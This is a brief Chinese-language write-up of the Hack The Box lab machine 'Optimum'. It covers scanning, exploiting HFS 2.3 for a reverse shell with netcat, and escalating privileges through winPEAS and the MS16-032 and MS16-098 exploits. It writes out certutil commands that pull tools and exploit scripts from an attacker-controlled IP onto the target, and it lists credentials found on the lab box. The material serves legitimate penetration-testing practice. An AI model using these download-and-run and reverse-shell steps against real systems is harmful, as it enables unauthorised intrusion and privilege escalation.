# Optimum
- URL : https://app.hackthebox.eu/machines/6
- IP : 10.129.209.84

## Information Gathering
- 掃 Port
	- ![](https://i.imgur.com/UWeIeq2.png)
- 觀察 80 port
	- ![](https://i.imgur.com/vSG54Vi.png)
	- HFS 2.3

## 尋找 Exploit
- 找到
	- https://www.exploit-db.com/exploits/39161
	- 需要準備 nc
		- `wget https://github.com/int0x33/nc.exe/raw/master/nc.exe`
- 依照需求開 http server
	- `python3 -m http.server 80`
	- 放 nc
- 執行腳本
	- ![](https://i.imgur.com/Tkxg89o.png)
- 收到 Reverse shell
	- ![](https://i.imgur.com/zBLykaz.png)
- 取得 User flag
	- ![](https://i.imgur.com/842n5hz.png)

## 提權
- `systeminfo`
	- ![](https://i.imgur.com/KiIGzft.png)
- 載豌豆
	- `certutil -urlcache -f http://10.10.16.35:8000/winPEASx64.exe winpeas.exe`
	- ![](https://i.imgur.com/QOVBLpk.png)
- 執行豌豆
	- ![](https://i.imgur.com/PjUZ8cP.png)
	- ![](https://i.imgur.com/dUHgWW1.png)
	- 看到帳密
		- `kostas`
		- `kdeEjDowkS*`
- 使用 Windows-Exploit-Suggester
	- https://github.com/AonCyberLabs/Windows-Exploit-Suggester
	- 需要先裝指定版本的 xlrd
		- `pip install xlrd==1.2.0`
	- `./windows-exploit-suggester.py --update`
	- ![](https://i.imgur.com/GwV0ET6.png)
		- 尋找推薦的 Exploit　腳本
- 嘗試 MS16-032
	- `wget https://www.exploit-db.com/download/39719 -O Invoke-MS16-032.ps1`
	- ![](https://i.imgur.com/RVDEYto.png)
	- 載腳本
		- `certutil -urlcache -f http://10.10.16.35/Invoke-MS16-032.ps1 Invoke-MS16-032.ps1`
	- 失敗
		- https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html
		- 看起來因為他是給 GUI 用的，需要彈出額外視窗
- 嘗試 MS16-098
	- https://github.com/sensepost/ms16-098
	- 載下來執行
		- ![](https://i.imgur.com/f9wRh6B.png)
		- 成功
	- 取得 System Flag
		- ![](https://i.imgur.com/OMCDFZi.png)
